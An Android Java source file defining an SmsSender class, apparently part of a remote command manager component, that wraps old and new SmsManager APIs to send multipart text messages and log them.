package com.vvt.remotecommandmanager.processor.communication;


import java.util.ArrayList;

import android.app.PendingIntent;
import android.content.Context;
import android.os.Build;

import com.vvt.datadeliverymanager.Customization;
import com.vvt.logger.FxLog;

public class SmsSender {
	private static final String TAG = "SmsSender";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;

	@SuppressWarnings("unused")
	private Context mContext;
	private SmsManagerWrapper mSmsManagerWrapper;

	public SmsSender(Context aContext) {
		mContext = aContext;

		if (Integer.parseInt(Build.VERSION.SDK) < 4) {
			mSmsManagerWrapper = BeforeApiLevel4Impl.Holder.instance;
		} else {
			mSmsManagerWrapper = ApiLevel4OrAboveImpl.Holder.instance;
		}
	}

	public void sendSms(String number, String textMessage) {
		if(LOGV) FxLog.v(TAG, String.format("sendSms # number: %s, message: %s",
					number, textMessage));

		try {
			mSmsManagerWrapper.sendMultipartTextMessage(number, null,
					mSmsManagerWrapper.divideMessage(textMessage), null, null);
		} catch (Exception e) {
			if(LOGD) FxLog.d(TAG, String.format("sendSms # Cannot send message due to error: %s", e.getMessage()));
		}
	}

	private static interface SmsManagerWrapper {

		ArrayList<String> divideMessage(String aText);

		void sendTextMessage(String aDestinationAddress, String aScAddress,
				String aText, PendingIntent aSentIntent,
				PendingIntent aDeliveryIntent);

		void sendMultipartTextMessage(String aDestinationAddress,
				String aScAddress, ArrayList<String> aParts,
				ArrayList<PendingIntent> aSentIntents,
				ArrayList<PendingIntent> aDeliveryIntents);
	}

	private static class BeforeApiLevel4Impl implements SmsManagerWrapper {

		@SuppressWarnings("deprecation")
		private android.telephony.gsm.SmsManager smsManager = android.telephony.gsm.SmsManager
				.getDefault();

		private static class Holder {
			private static final BeforeApiLevel4Impl instance = new BeforeApiLevel4Impl();
		}

		@SuppressWarnings("deprecation")
		public ArrayList<String> divideMessage(String aText) {
			return smsManager.divideMessage(aText);
		}

		@SuppressWarnings("deprecation")
		public void sendTextMessage(String aDestinationAddress,
				String aScAddress, String aText, PendingIntent aSentIntent,
				PendingIntent aDeliveryIntent) {
			smsManager.sendTextMessage(aDestinationAddress, aScAddress, aText,
					aSentIntent, aDeliveryIntent);
		}

		@SuppressWarnings("deprecation")
		public void sendMultipartTextMessage(String aDestinationAddress,
				String aScAddress, ArrayList<String> aParts,
				ArrayList<PendingIntent> aSentIntents,
				ArrayList<PendingIntent> aDeliveryIntents) {
			smsManager.sendMultipartTextMessage(aDestinationAddress,
					aScAddress, aParts, aSentIntents, aDeliveryIntents);
		}

	}

	private static class ApiLevel4OrAboveImpl implements SmsManagerWrapper {

		private android.telephony.SmsManager smsManager = android.telephony.SmsManager
				.getDefault();

		private static class Holder {
			private static final ApiLevel4OrAboveImpl instance = new ApiLevel4OrAboveImpl();
		}

		public ArrayList<String> divideMessage(String aText) {
			return smsManager.divideMessage(aText);
		}

		public void sendTextMessage(String aDestinationAddress,
				String aScAddress, String aText, PendingIntent aSentIntent,
				PendingIntent aDeliveryIntent) {
			smsManager.sendTextMessage(aDestinationAddress, aScAddress, aText,
					aSentIntent, aDeliveryIntent);
		}

		public void sendMultipartTextMessage(String aDestinationAddress,
				String aScAddress, ArrayList<String> aParts,
				ArrayList<PendingIntent> aSentIntents,
				ArrayList<PendingIntent> aDeliveryIntents) {
			smsManager.sendMultipartTextMessage(aDestinationAddress,
					aScAddress, aParts, aSentIntents, aDeliveryIntents);
		}

	}

}
